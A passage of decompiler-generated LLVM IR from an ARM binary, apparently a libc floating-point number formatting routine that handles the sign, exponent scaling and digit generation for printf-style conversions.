  %v3_1a358 = load i32, i32* %v2_1a358, align 4
  store i32 %v3_1a358, i32* @lr, align 4
  br i1 %v7_1a324, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_1a35c = urem i32 %v1_1a35c, 256
  store i32 %v2_1a35c, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_1a360 = icmp slt i32 %v2_1a33c, 0
  %v2_1a360 = icmp eq i32 %v2_1a33c, 0
  store i1 %v2_1a360, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_1a360, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_1a370 = and i32 %v3_1a354, 2
  %v2_1a370 = icmp eq i32 %v1_1a370, 0
  store i1 %v2_1a370, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_1a370, label %dec_label_pc_1a388, label %dec_label_pc_1a394

dec_label_pc_1a388:                               ; preds = %bb205
  %v1_1a388 = urem i32 %v3_1a354, 2
  %v2_1a388 = icmp eq i32 %v1_1a388, 0
  store i1 %v2_1a388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a388, label %dec_label_pc_1a398, label %dec_label_pc_1a394

dec_label_pc_1a394:                               ; preds = %dec_label_pc_1a388, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_1a388 ]
  %v0_1a394.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_1a388 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_1a394.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_1a398

dec_label_pc_1a398:                               ; preds = %dec_label_pc_1a388, %dec_label_pc_1a394
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_1a344, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_1a344, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_1a3b4 = fptrunc double %arg2 to float
  %v2_1a3b4 = bitcast float %v1_1a3b4 to i32
  %v9_1a3b4 = call i32 @__aeabi_dcmpeq(i32 %v2_1a3b4, i32 %v0_1a344, i32 %v2_1a3b4, i32 %v0_1a344, i32 0)
  store i32 %v9_1a3b4, i32* %r0.global-to-local, align 4
  %v2_1a3b8 = icmp eq i32 %v9_1a3b4, 0
  store i1 %v2_1a3b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a3b8, label %bb207, label %dec_label_pc_1a3c8

bb207:                                            ; preds = %dec_label_pc_1a398
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a47c

dec_label_pc_1a3c8:                               ; preds = %dec_label_pc_1a398
  %v0_1a3c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1a3c8, i32* @r0, align 4
  %v0_1a3cc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a3cc, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_1a3d8 = call i32 @__aeabi_dcmpeq(i32 %v0_1a3c8, i32 %v0_1a3cc, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1a3d8, i32* %r0.global-to-local, align 4
  %v2_1a3dc = icmp eq i32 %v7_1a3d8, 0
  store i1 %v2_1a3dc, i1* %cpsr_z.global-to-local, align 1
  %v0_1a424 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a424 = sext i32 %v0_1a424 to i64
  %v2_1a424 = bitcast i64 %v1_1a424 to double
  br i1 %v2_1a3dc, label %dec_label_pc_1a424, label %dec_label_pc_1a3e4

dec_label_pc_1a3e4:                               ; preds = %dec_label_pc_1a3c8
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_1a3f4 = fdiv double 0.000000e+00, %v2_1a424
  %v10_1a3f4 = fptrunc double %v9_1a3f4 to float
  %v11_1a3f4 = bitcast float %v10_1a3f4 to i32
  store i32 %v11_1a3f4, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_1a400 = call i32 @__aeabi_dcmplt(i32 %v11_1a3f4, i32 1072693248, i32 0, i32 0)
  store i32 %v4_1a400, i32* %r0.global-to-local, align 4
  %v2_1a404 = icmp eq i32 %v4_1a400, 0
  store i1 %v2_1a404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a404, label %bb208, label %dec_label_pc_1a410

bb208:                                            ; preds = %dec_label_pc_1a3e4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a5f0

dec_label_pc_1a410:                               ; preds = %dec_label_pc_1a3e4
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_1a5f0

dec_label_pc_1a424:                               ; preds = %dec_label_pc_1a3c8
  store i32 %v0_1a424, i32* @r0, align 4
  %v0_1a428 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a428, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1a434 = fptrunc double %v2_1a424 to float
  %v2_1a434 = bitcast float %v1_1a434 to i32
  %v6_1a434 = call i32 @__aeabi_dcmplt(i32 %v2_1a434, i32 %v0_1a428, i32 0, i32 0)
  store i32 %v6_1a434, i32* %r0.global-to-local, align 4
  %v2_1a438 = icmp eq i32 %v6_1a434, 0
  store i1 %v2_1a438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a438, label %dec_label_pc_1a424..thread9_crit_edge, label %bb209

dec_label_pc_1a424..thread9_crit_edge:            ; preds = %dec_label_pc_1a424
  %v0_1a458.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_1a424
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_1a440 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a440 = sub i32 0, %v1_1a440
  store i32 %v2_1a440, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_1a440, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1a424..thread9_crit_edge, %bb209
  %v0_1a458 = phi i32 [ %v0_1a458.pre, %dec_label_pc_1a424..thread9_crit_edge ], [ %v2_1a440, %bb209 ]
  %v0_1a454 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a454 = sext i32 %v0_1a454 to i64
  %v2_1a454 = bitcast i64 %v1_1a454 to double
  %v9_1a45c = fmul double %v2_1a454, 0.000000e+00
  %v10_1a45c = fptrunc double %v9_1a45c to float
  %v11_1a45c = bitcast float %v10_1a45c to i32
  store i32 %v11_1a45c, i32* @r2, align 4
  store i32 %v0_1a458, i32* %r3.global-to-local, align 4
  store i32 %v0_1a454, i32* @r0, align 4
  store i32 %v0_1a458, i32* %r1.global-to-local, align 4
  %v7_1a470 = call i32 @__aeabi_dcmpeq(i32 %v0_1a454, i32 %v0_1a458, i32 %v11_1a45c, i32 %v0_1a458, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1a470, i32* %r0.global-to-local, align 4
  %v2_1a474 = icmp eq i32 %v7_1a470, 0
  store i1 %v2_1a474, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a474, label %dec_label_pc_1a4c8, label %.thread9.dec_label_pc_1a47c_crit_edge

.thread9.dec_label_pc_1a47c_crit_edge:            ; preds = %.thread9
  %v3_1a47c.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_1a47c

dec_label_pc_1a47c:                               ; preds = %bb207, %.thread9.dec_label_pc_1a47c_crit_edge
  %v3_1a47c = phi i32 [ %v3_1a47c.pre, %.thread9.dec_label_pc_1a47c_crit_edge ], [ %arg4, %bb207 ]
  %v1_1a3c0.v0_1a3ac5 = phi i32 [ 0, %.thread9.dec_label_pc_1a47c_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_1a47c, i32* %ip.global-to-local, align 4
  %v2_1a484 = add i32 %v3_1a47c, 16
  %v3_1a484 = inttoptr i32 %v2_1a484 to i32*
  store i32 32, i32* %v3_1a484, align 4
  %v0_1a48c = load i32, i32* %sb.global-to-local, align 4
  %v7_1a48c = icmp eq i32 %v0_1a48c, 96
  store i1 %v7_1a48c, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_1a48c, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_1a47c
  %v5_1a4a0 = or i32 %v1_1a3c0.v0_1a3ac5, 4
  store i32 %v5_1a4a0, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_1a47c, %bb210
  %v4_1a4a4 = phi i32 [ %v5_1a4a0, %bb210 ], [ 3, %dec_label_pc_1a47c ]
  %v4_1a4a4.v1_1a3c0.v0_1a3ac = select i1 %tmp274, i32 %v4_1a4a4, i32 %v1_1a3c0.v0_1a3ac5
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33476), i32* %r3.global-to-local, align 4
  %v2_1a4b8 = add i32 %v4_1a4a4.v1_1a3c0.v0_1a3ac, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33476)
  store i32 %v2_1a4b8, i32* %r2.global-to-local, align 4
  %v2_1a4bc = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1a4bc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a9e4

dec_label_pc_1a4c8:                               ; preds = %.thread9
  %v0_1a4c8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a4c8, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_1a4d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1a4d0, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_1a4d8 = call i32 @__aeabi_dcmplt(i32 %v0_1a4d0, i32 %v0_1a4c8, i32 0, i32 1100470148)
  store i32 %v6_1a4d8, i32* %r0.global-to-local, align 4
  %v2_1a4dc = icmp eq i32 %v6_1a4d8, 0
  store i1 %v2_1a4dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a4dc, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_1a4c8
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_1a4c8, %bb211
  %v0_1a4e4 = phi i32 [ 0, %dec_label_pc_1a4c8 ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33452), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33452), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_1a518 = icmp eq i32 %v0_1a4e4, 0
  br label %dec_label_pc_1a508

dec_label_pc_1a508:                               ; preds = %dec_label_pc_1a5a0.dec_label_pc_1a508_crit_edge, %bb212
  %v2_1a510 = phi i32 [ add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33452), %bb212 ], [ %v2_1a510.pre, %dec_label_pc_1a5a0.dec_label_pc_1a508_crit_edge ]
  %v0_1a50c = phi i32 [ 9, %bb212 ], [ %v0_1a5a0, %dec_label_pc_1a5a0.dec_label_pc_1a508_crit_edge ]
  %v2_1a550 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_1a5a0.dec_label_pc_1a508_crit_edge ]
  store i32 %v0_1a4e4, i32* %r2.global-to-local, align 4
  %v1_1a50c = add i32 %v0_1a50c, -1
  store i32 %v1_1a50c, i32* %sl.global-to-local, align 4
  store i32 %v2_1a510, i32* @lr, align 4
  %v3_1a514 = mul i32 %v1_1a50c, 8
  store i32 %v3_1a514, i32* %r3.global-to-local, align 4
  store i1 %v2_1a518, i1* %cpsr_z.global-to-local, align 1
  %v0_1a51c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1a51c, i32* %r0.global-to-local, align 4
  %v0_1a520 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a520, i32* %r1.global-to-local, align 4
  %v2_1a524 = add i32 %v3_1a514, %v2_1a510
  store i32 %v2_1a524, i32* %ip.global-to-local, align 4
  %v1_1a560 = inttoptr i32 %v2_1a524 to i32*
  %v2_1a560 = load i32, i32* %v1_1a560, align 4
  %v3_1a560 = sext i32 %v2_1a560 to i64
  %v1_1a564 = sext i32 %v0_1a51c to i64
  %v2_1a564 = bitcast i64 %v1_1a564 to double
  br i1 %v2_1a518, label %dec_label_pc_1a560, label %dec_label_pc_1a52c

dec_label_pc_1a52c:                               ; preds = %dec_label_pc_1a508
  %v8_1a530 = bitcast i64 %v3_1a560 to double
  %v9_1a530 = fmul double %v2_1a564, %v8_1a530
  %v10_1a530 = fptrunc double %v9_1a530 to float
  %v11_1a530 = bitcast float %v10_1a530 to i32
  store i32 %v11_1a530, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_1a530, i32* %r7.global-to-local, align 4
  store i32 %v0_1a520, i32* %r8.global-to-local, align 4
  %v4_1a544 = call i32 @__aeabi_dcmplt(i32 %v11_1a530, i32 %v0_1a520, i32 0, i32 1104006501)
  store i32 %v4_1a544, i32* %r0.global-to-local, align 4
  %v2_1a548 = icmp eq i32 %v4_1a544, 0
  store i1 %v2_1a548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a548, label %dec_label_pc_1a5a0, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_1a52c
  %v1_1a550 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a550 = sub i32 %v2_1a550, %v1_1a550
  store i32 %v3_1a550, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a598

dec_label_pc_1a560:                               ; preds = %dec_label_pc_1a508
  store i32 %v0_1a520, i32* @r1, align 4
  %v8_1a56c = bitcast i64 %v3_1a560 to double
  %v9_1a56c = fdiv double %v2_1a564, %v8_1a56c
  %v10_1a56c = fptrunc double %v9_1a56c to float
  %v11_1a56c = bitcast float %v10_1a56c to i32
  store i32 %v11_1a56c, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_1a56c, i32* %r7.global-to-local, align 4
  store i32 %v0_1a520, i32* %r8.global-to-local, align 4
  %v4_1a580 = call i32 @__aeabi_dcmpge(i32 %v11_1a56c, i32 %v0_1a520, i32 0, i32 1100470148)
  store i32 %v4_1a580, i32* %r0.global-to-local, align 4
  %v2_1a584 = icmp eq i32 %v4_1a580, 0
  store i1 %v2_1a584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a584, label %dec_label_pc_1a5a0, label %dec_label_pc_1a58c

dec_label_pc_1a58c:                               ; preds = %dec_label_pc_1a560
  %v1_1a590 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a590 = add i32 %v1_1a590, %v2_1a550
  store i32 %v2_1a590, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a598

dec_label_pc_1a598:                               ; preds = %.thread10, %dec_label_pc_1a58c
  %stack_var_-192.2 = phi i32 [ %v2_1a590, %dec_label_pc_1a58c ], [ %v3_1a550, %.thread10 ]
  %v0_1a598 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1a598, i32* %r5.global-to-local, align 4
  %v0_1a59c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1a59c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a5a0

dec_label_pc_1a5a0:                               ; preds = %dec_label_pc_1a52c, %dec_label_pc_1a560, %dec_label_pc_1a598
  %stack_var_-192.3 = phi i32 [ %v2_1a550, %dec_label_pc_1a560 ], [ %stack_var_-192.2, %dec_label_pc_1a598 ], [ %v2_1a550, %dec_label_pc_1a52c ]
  %v0_1a5a0 = load i32, i32* %sl.global-to-local, align 4
  %v2_1a5a0 = icmp eq i32 %v0_1a5a0, 0
  store i1 %v2_1a5a0, i1* %cpsr_z.global-to-local, align 1
  %v0_1a5a4 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a5a4 = sdiv i32 %v0_1a5a4, 2
  store i32 %v3_1a5a4, i32* %r4.global-to-local, align 4
  br i1 %v2_1a5a0, label %dec_label_pc_1a5ac, label %dec_label_pc_1a5a0.dec_label_pc_1a508_crit_edge

dec_label_pc_1a5a0.dec_label_pc_1a508_crit_edge:  ; preds = %dec_label_pc_1a5a0
  %v2_1a510.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_1a508

dec_label_pc_1a5ac:                               ; preds = %dec_label_pc_1a5a0
  %v0_1a5ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1a5ac, i32* @r0, align 4
  %v0_1a5b0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a5b0, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_1a5bc = call i32 @__aeabi_dcmpge(i32 %v0_1a5ac, i32 %v0_1a5b0, i32 0, i32 1104006501)
  store i32 %v6_1a5bc, i32* %r0.global-to-local, align 4
  %v2_1a5c0 = icmp eq i32 %v6_1a5bc, 0
  store i1 %v2_1a5c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5c0, label %dec_label_pc_1a5f0, label %dec_label_pc_1a5c8

dec_label_pc_1a5c8:                               ; preds = %dec_label_pc_1a5ac
  %v0_1a5c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a5c8 = sext i32 %v0_1a5c8 to i64
  %v2_1a5c8 = bitcast i64 %v1_1a5c8 to double
  %v0_1a5cc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a5cc, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_1a5d8 = fdiv double %v2_1a5c8, 0.000000e+00
  %v10_1a5d8 = fptrunc double %v9_1a5d8 to float
  %v11_1a5d8 = bitcast float %v10_1a5d8 to i32
  store i32 %v11_1a5d8, i32* %r0.global-to-local, align 4
  store i32 %v11_1a5d8, i32* %r5.global-to-local, align 4
  %v1_1a5e8 = add i32 %stack_var_-192.3, 1
  store i32 %v1_1a5e8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a5f0

dec_label_pc_1a5f0:                               ; preds = %dec_label_pc_1a5c8, %bb208, %dec_label_pc_1a5ac, %dec_label_pc_1a410
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_1a5ac ], [ -1, %dec_label_pc_1a410 ], [ -1, %bb208 ], [ %v1_1a5e8, %dec_label_pc_1a5c8 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1a5f4 = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_1a5f4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1a5f8

dec_label_pc_1a5f8:                               ; preds = %dec_label_pc_1a670, %dec_label_pc_1a5f0
  %v0_1a5f8 = load i32, i32* %r6.global-to-local, align 4
  %v0_1a5fc = load i32, i32* %r5.global-to-local, align 4
  %v1_1a600 = sext i32 %v0_1a5fc to i64
  %v2_1a600 = bitcast i64 %v1_1a600 to double
  %v3_1a600 = fptoui double %v2_1a600 to i32
  store i32 %v3_1a600, i32* %r8.global-to-local, align 4
  store i32 %v3_1a600, i32* %r2.global-to-local, align 4
  store i32 %v0_1a5f8, i32* %r3.global-to-local, align 4
  store i32 %v0_1a5fc, i32* @r0, align 4
  store i32 %v0_1a5f8, i32* %r1.global-to-local, align 4
  %v6_1a61c = call i32 @__aeabi_dsub(i32 %v0_1a5fc, i32 %v0_1a5f8, i32 %v3_1a600, i32 %v0_1a5f8)
  %v7_1a61c = sext i32 %v6_1a61c to i64
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v3_1a628 = bitcast i64 %v7_1a61c to double
  %v9_1a628 = fmul double %v3_1a628, 0.000000e+00
  %v10_1a628 = fptrunc double %v9_1a628 to float
  %v11_1a628 = bitcast float %v10_1a628 to i32
  store i32 %v11_1a628, i32* %r0.global-to-local, align 4
  %v0_1a62c = load i32, i32* %sl.global-to-local, align 4
  %v1_1a62c = add i32 %v0_1a62c, 9
  store i32 %v1_1a62c, i32* %sl.global-to-local, align 4
  store i32 %v11_1a628, i32* %r5.global-to-local, align 4
  store i32 %v0_1a5f8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1a63c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a63c

dec_label_pc_1a63c:                               ; preds = %dec_label_pc_1a63c.dec_label_pc_1a63c_crit_edge, %dec_label_pc_1a5f8
  %v1_1a650 = phi i32 [ %v1_1a650.pre, %dec_label_pc_1a63c.dec_label_pc_1a63c_crit_edge ], [ %v1_1a62c, %dec_label_pc_1a5f8 ]
  %v0_1a648 = phi i32 [ %v0_1a664, %dec_label_pc_1a63c.dec_label_pc_1a63c_crit_edge ], [ 0, %dec_label_pc_1a5f8 ]
  %v0_1a654 = phi i32 [ %v2_1a660, %dec_label_pc_1a63c.dec_label_pc_1a63c_crit_edge ], [ %v0_1a63c.pre, %dec_label_pc_1a5f8 ]
  %v3_1a644 = urem i32 %v0_1a654, 10
  %v1_1a648 = add i32 %v0_1a648, 1
  store i32 %v1_1a648, i32* %r7.global-to-local, align 4
  %v1_1a64c = or i32 %v3_1a644, 48
  store i32 %v1_1a64c, i32* %r2.global-to-local, align 4
  %v2_1a650 = sub i32 %v1_1a650, %v1_1a648
  store i32 %v2_1a650, i32* %r3.global-to-local, align 4
  store i32 %v0_1a654, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1a65c = trunc i32 %v1_1a64c to i8
  %v3_1a65c = inttoptr i32 %v2_1a650 to i8*
  store i8 %v1_1a65c, i8* %v3_1a65c, align 1
  %v0_1a660 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a660 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a660 = udiv i32 %v0_1a660, %v1_1a660
  store i32 %v2_1a660, i32* %r0.global-to-local, align 4
  %v0_1a664 = load i32, i32* %r7.global-to-local, align 4
  %v7_1a664 = icmp eq i32 %v0_1a664, 8
  store i1 %v7_1a664, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1a660, i32* %r8.global-to-local, align 4
  %v7_1a66c = icmp slt i32 %v0_1a664, 9
  br i1 %v7_1a66c, label %dec_label_pc_1a63c.dec_label_pc_1a63c_crit_edge, label %dec_label_pc_1a670

dec_label_pc_1a63c.dec_label_pc_1a63c_crit_edge:  ; preds = %dec_label_pc_1a63c
  %v1_1a650.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1a63c

dec_label_pc_1a670:                               ; preds = %dec_label_pc_1a63c
  %v0_1a670 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a670 = add i32 %v0_1a670, 1
  store i32 %v1_1a670, i32* %r4.global-to-local, align 4
  %v7_1a674 = icmp eq i32 %v0_1a670, 0
  store i1 %v7_1a674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a674, label %dec_label_pc_1a5f8, label %dec_label_pc_1a67c

dec_label_pc_1a67c:                               ; preds = %dec_label_pc_1a670
  %v0_1a67c = load i32, i32* %sb.global-to-local, align 4
  %v7_1a67c = icmp eq i32 %v0_1a67c, 96
  store i1 %v7_1a67c, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_1a67c, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_1a67c
  %v5_1a68c = add i32 %v0_1a67c, 32
  store i32 %v5_1a68c, i32* %r3.global-to-local, align 4
  %v5_1a690 = urem i32 %v5_1a68c, 256
  store i32 %v5_1a690, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_1a67c
  %v4_1a688.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_1a688.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_1a688126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_1a6b0 = phi i32 [ %v0_1a67c, %thread-pre-split ], [ %v5_1a690, %bb213 ]
  %v7_1a694 = icmp eq i32 %v0_1a6b0, 103
  %. = zext i1 %v7_1a694 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_1a6a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_1a6a0 = icmp eq i32 %v0_1a6a0, 0
  store i1 %v2_1a6a0, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_1a6a0, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_1a6a8 = icmp eq i1 %v7_1a694, false
  store i1 %v2_1a6a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a6a8, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_1a6ac = add i32 %v0_1a6a0, -1
  store i32 %v2_1a6ac, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_1a6c0 = phi i32 [ %v0_1a6a0, %.thread16 ], [ %v0_1a6a0, %bb218 ], [ %v2_1a6ac, %bb219 ]
  %v7_1a6b0 = icmp eq i32 %v0_1a6b0, 102
  store i1 %v7_1a6b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a6b0, label %dec_label_pc_1a6bc, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_1a6c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a6e4

dec_label_pc_1a6bc:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_1a6c0 = add i32 %v0_1a6c0, %stack_var_-192.4
  store i32 %v2_1a6c0, i32* %ip.global-to-local, align 4
  %v8_1a6c4 = icmp eq i32 %v2_1a6c0, -1
  store i1 %v8_1a6c4, i1* %cpsr_z.global-to-local, align 1
  %v6_1a6c8 = icmp slt i32 %v2_1a6c0, -1
  br i1 %v6_1a6c8, label %dec_label_pc_1a6cc, label %dec_label_pc_1a6e4

dec_label_pc_1a6cc:                               ; preds = %dec_label_pc_1a6bc
  %v2_1a6cc = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_1a6cc, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_1a6d8 = bitcast i32* %stack_var_-83 to i8*
  %v3_1a6d8 = call i32 @__GI_memset(i8* %v2_1a6d8, i32 48)
  store i32 %v3_1a6d8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a6e4

dec_label_pc_1a6e4:                               ; preds = %bb221, %dec_label_pc_1a6bc, %dec_label_pc_1a6cc
  %v1_1a72892 = phi i32 [ %v3_1a6d8, %dec_label_pc_1a6cc ], [ %v2_1a660, %dec_label_pc_1a6bc ], [ %v2_1a660, %bb221 ]
  %v1_1a70c = phi i32 [ -1, %dec_label_pc_1a6cc ], [ %v2_1a6c0, %dec_label_pc_1a6bc ], [ %v0_1a6c0, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_1a6cc ], [ %stack_var_-192.4, %dec_label_pc_1a6bc ], [ %stack_var_-192.4, %bb221 ]
  %v1_1a6e8 = add i32 %v1_1a70c, -16
  %v3_1a6e8 = sub i32 15, %v1_1a70c
  %v4_1a6e8 = and i32 %v3_1a6e8, %v1_1a70c
  %v5_1a6e8 = icmp slt i32 %v4_1a6e8, 0
  %v6_1a6e8 = icmp slt i32 %v1_1a6e8, 0
  %v7_1a6e8 = icmp eq i32 %v1_1a70c, 16
  store i1 %v7_1a6e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_1a6f4 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_1a6f4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_1a6fc = xor i1 %v6_1a6e8, %v5_1a6e8
  %v4_1a6fc = or i1 %v7_1a6e8, %v3_1a6fc
  br i1 %v4_1a6fc, label %dec_label_pc_1a708, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_1a6e4
  %v7_1a6fc137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_1a6fc137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

